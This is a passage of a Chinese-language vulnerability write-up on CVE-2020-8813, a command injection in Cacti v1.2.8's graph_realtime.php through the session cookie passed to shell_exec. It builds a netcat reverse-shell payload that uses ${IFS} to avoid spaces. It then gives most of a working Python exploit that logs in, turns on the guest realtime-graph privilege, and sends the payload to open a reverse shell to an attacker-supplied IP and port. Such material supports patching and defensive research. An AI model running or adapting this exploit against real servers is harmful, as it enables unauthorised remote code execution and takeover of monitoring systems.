class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($valid == true) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = $_REQUEST[$name];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} elseif (!cacti_sizeof($options)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = filter_var($_REQUEST[$name], $filter);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = filter_var($_REQUEST[$name], $filter, $options);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($value === false) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($filter == FILTER_VALIDATE_IS_REGEX) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_SESSION[&#39;custom_error&#39;] = __(&#39;The search term &quot;%s&quot; is not valid. Error is %s&#39;, html_escape(get_nfilter_request_var($name)), html_escape($custom_error));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;set_request_var($name, &#39;&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raise_message(&#39;custom_error&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;die_html_input_error($name, get_nfilter_request_var($name));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;set_request_var($name, $value);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $value;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (isset($options[&#39;default&#39;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;set_request_var($name, $options[&#39;default&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $options[&#39;default&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">该函数将过滤输入并返回一个干净的变量以传递给该函数。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">另外，对于第二个变量</span><span class="cs8926E06">&ldquo; $ graph_data_array [&#39;ds_step&#39;]&rdquo;</span><span class="cs9C1B1871">，它已经通过</span><span class="cs8926E06">sprintf</span><span class="cs9C1B1871">处理为％</span><span class="cs8926E06">d</span><span class="cs9C1B1871">，表示</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">十进制值</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">，因此我们不能使用它来注入恶意命令。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">那么我们怎样才能使这件事起作用呢？让我们再次看一下代码：</span></p><p class="cs6FD73CFB"><span class="cs8926E06">graph_realtime.php</span></p><p class="cs3A447A38"><span class="cs9FB05234">/* call poller */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$graph_rrd = read_config_option(&#39;realtime_cache_path&#39;) . &#39;/user_&#39; . session_id() . &#39;_lgi_&#39; . get_request_var(&#39;local_graph_id&#39;) . &#39;.png&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$command &nbsp;&nbsp;= read_config_option(&#39;path_php_binary&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$args &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= sprintf(&#39;poller_realtime.php --graph=%s --interval=%d --poller_id=&#39; . session_id(), get_request_var(&#39;local_graph_id&#39;), $graph_data_array[&#39;ds_step&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">shell_exec(&quot;$command $args&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/* construct the image name &nbsp;*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$graph_data_array[&#39;export_realtime&#39;] = $graph_rrd;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$graph_data_array[&#39;output_flag&#39;] &nbsp;&nbsp;&nbsp;&nbsp;= RRDTOOL_OUTPUT_GRAPH_DATA;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$null_param = array();</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们得到另一个传递给</span><span class="cs8926E06">shell_exec</span><span class="cs9C1B1871">的变量，它是</span><span class="cs8926E06">&ldquo; session_id</span><span class="cs9C1B1871">（）</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">函数的值，该函数将返回用户当前会话的值，这意味着我们可以使用它来注入命令！</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可是等等！如果我们操纵了会话，则将无法访问该页面，因为该页面要求对用户进行身份验证才能访问该页面。因此，在软件中进行了一些额外的挖掘之后，我发现如果我们能够以访客身份访问该页面启用了一种称为</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">实时图</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">的特殊特权，我们可以从此页面看到：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Cacti/%ef%bc%88CVE-2020-8813%ef%bc%89Cacti%20v1.2.8%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="566" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">让我们尝试在没有启用</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">访客实时图</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">特权的情况下访问此页面：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Cacti/%ef%bc%88CVE-2020-8813%ef%bc%89Cacti%20v1.2.8%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="298" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如我们所见，由于权限问题，我们无法访问该页面，不允许尝试启用它并访问该页面以获取以下内容：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Cacti/%ef%bc%88CVE-2020-8813%ef%bc%89Cacti%20v1.2.8%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="122" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">完美的是，我们访问了页面，现在我将向</span><span class="cs8926E06">&ldquo; graph_realtime.php&rdquo;</span><span class="cs9C1B1871">发送请求，并添加一条调试语句，该语句将回显将传递给</span><span class="cs8926E06">shell_exec</span><span class="cs9C1B1871">的参数：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Cacti/%ef%bc%88CVE-2020-8813%ef%bc%89Cacti%20v1.2.8%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="83" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Cacti/%ef%bc%88CVE-2020-8813%ef%bc%89Cacti%20v1.2.8%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="490" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如我们所见，我们将会话打印输出给我们，因此让我们尝试将自定义字符串注入会话中，看看会发生什么：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Cacti/%ef%bc%88CVE-2020-8813%ef%bc%89Cacti%20v1.2.8%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="128" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="payload编写"><span class="csD1E291E2">payload</span><span class="csD6CA00D2">编写</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在控制了会话值之后，我们需要使用它来在系统上执行代码，但这仍然是一个会话值，这意味着即使对它进行编码也不能在其中使用某些字符，因此我们需要编写</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">会话友好</span><span class="cs8926E06">&rdquo; &rdquo;</span><span class="cs9C1B1871">，我们可以注入这些有效负载而无需强制应用程序为我们生成另一个</span><span class="cs8926E06">Cookie</span><span class="cs9C1B1871">值。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">例如，如果我对字符串</span><span class="cs8926E06">&ldquo; Hi Payload&rdquo;</span><span class="cs9C1B1871">进行编码并将其传递给应用程序，我将得到以下信息：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Cacti/%ef%bc%88CVE-2020-8813%ef%bc%89Cacti%20v1.2.8%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image6.png" width="533" height="419" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Cacti/%ef%bc%88CVE-2020-8813%ef%bc%89Cacti%20v1.2.8%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image7.png" width="560" height="127" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如我们所见，该应用程序为我们设置了一个</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">而不是我们注入的</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">，因此要解决此问题，我们需要使用自定义有效负载。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因此，为了避免使用空格，我想到了使用</span><span class="cs8926E06">&ldquo; $ {IFS}&rdquo; bash</span><span class="cs9C1B1871">变量来表示空格的想法。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当然，我们需要使用</span><span class="cs8926E06">&ldquo;;&rdquo;</span><span class="cs9C1B1871">转义命令</span><span class="cs8926E06"> </span><span class="cs9C1B1871">如下所示：</span></p><p class="cs3A447A38"><span class="cs9FB05234">;payload</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果要使用</span><span class="cs8926E06">netcat</span><span class="cs9C1B1871">获得外壳，则需要创建以下有效负载：</span></p><p class="cs3A447A38"><span class="cs9FB05234">;``nc``${IFS}-e${IFS}``/bin/bash``${IFS}ip${IFS}port</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">让我们尝试一下，首先对有效负载进行编码，以查看结果：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Cacti/%ef%bc%88CVE-2020-8813%ef%bc%89Cacti%20v1.2.8%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image8.png" width="560" height="126" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后将其发送到应用程序以获取以下信息：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Cacti/%ef%bc%88CVE-2020-8813%ef%bc%89Cacti%20v1.2.8%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image9.png" width="560" height="402" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="完整版的poc"><span class="csD6CA00D2">完整版的</span><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">为了自动化利用过程，我编写了一个</span><span class="cs8926E06">python</span><span class="cs9C1B1871">代码来利用此漏洞，利用此漏洞将处理登录过程以启用</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">来宾实时图</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">特权，然后将生成有效负载并将精心制作的请求发送到</span><span class="cs8926E06">&ldquo; graph_realtime.php&rdquo;</span><span class="cs9C1B1871">页面为了获得反向壳。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这是完整的利用代码：</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/python3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Exploit Title: Cacti v1.2.8 Remote Code Execution</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Date: 03/02/2020</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Exploit Author: Askar (@mohammadaskar2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># CVE: CVE-2020-8813</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Vendor Homepage: https://cacti.net/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Version: v1.2.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Tested on: CentOS 7.3 / PHP 7.1.33</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import warnings</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from bs4 import BeautifulSoup</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from urllib.parse import quote</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">warnings.filterwarnings(&quot;ignore&quot;, category=UserWarning, module=&#39;bs4&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if len(sys.argv) != 6:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[~] Usage : ./Cacti-exploit.py url username password ip port&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url = sys.argv[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">username = sys.argv[2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">password = sys.argv[3]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ip = sys.argv[4]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">port = sys.argv[5]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def login(token):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;login_info = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;login_username&quot;: username,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;login_password&quot;: password,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;action&quot;: &quot;login&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;__csrf_magic&quot;: token</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;login_request = request.post(url+&quot;/index.php&quot;, login_info)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;login_text = login_request.text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if &quot;Invalid User Name/Password Please Retype&quot; in login_text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return False</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return True</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def enable_guest(token):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;request_info = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;id&quot;: &quot;3&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;section25&quot;: &quot;on&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;section7&quot;: &quot;on&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;tab&quot;: &quot;realms&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;save_component_realm_perms&quot;: 1,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;action&quot;: &quot;save&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;__csrf_magic&quot;: token</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;enable_request = request.post(url+&quot;/user_admin.php?header=false&quot;, request_info)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if enable_request:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return True</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return False</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def send_exploit():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload = &quot;;nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s&quot; % (ip, port)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cookies = {&#39;Cacti&#39;: quote(payload)}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;requests.get(url+&quot;/graph_realtime.php?action=init&quot;, cookies=cookies)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">request = requests.session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;[+]Retrieving login CSRF token&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">page = request.get(url+&quot;/index.php&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">html_content = page.text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">soup = BeautifulSoup(html_content, &quot;html5lib&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">token = soup.findAll(&#39;input&#39;)[0].get(&quot;value&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if token:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+]Token Found : %s&quot; % token)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+]Sending creds ..&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;login_status = login(token)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if login_status:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+]Successfully LoggedIn&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+]Retrieving CSRF token ..&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;page = request.get(url+&quot;/user_admin.php?action=user_edit&amp;id=3&amp;tab=realms&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;html_content = page.text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;soup = BeautifulSoup(html_content, &quot;html5lib&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;token = soup.findAll(&#39;input&#39;)[1].get(&quot;value&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if token:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+]Making some noise ..&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;guest_realtime = enable_guest(token)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if guest_realtime:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+]Sending malicous request, check your nc ;)&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;send_exploit()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[-]Error while activating the malicous account&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[-] Unable to retrieve CSRF token from admin page!&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 